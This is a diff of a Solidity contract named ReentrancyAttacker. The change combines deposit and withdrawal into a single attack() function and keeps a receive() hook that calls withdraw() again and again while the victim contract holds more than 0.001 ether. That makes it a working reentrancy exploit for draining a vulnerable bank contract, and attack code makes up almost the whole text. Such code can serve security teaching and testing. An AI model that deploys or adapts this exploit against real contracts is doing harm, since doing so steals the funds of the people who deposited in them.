@@ -15,29 +15,13 @@ contract ReentrancyAttacker {
         victimContract = IVictimBank(_victim);
     }
 
-    function feed() external payable {
+    function attack() external payable {
         require(msg.sender == owner, "Not owner");
-        uint256 contractBalance = address(this).balance;
-        require(contractBalance > 0, "No funds to deposit");
-        victimContract.deposit{value: contractBalance}();
-    }
-
-    function attack() external {
-        require(msg.sender == owner, "Not owner");
+        victimContract.deposit{value: msg.value}();
         victimContract.withdraw();
     }
 
-    function fund() external payable {}
-
     receive() external payable {
-        uint256 targetBalance = address(victimContract).balance;
-
-        if (targetBalance > 1000000000000000 wei) {
-            victimContract.withdraw();
-        }
-    }
-
-    fallback() external payable {
         uint256 targetBalance = address(victimContract).balance;
 
         if (targetBalance > 1000000000000000 wei) {
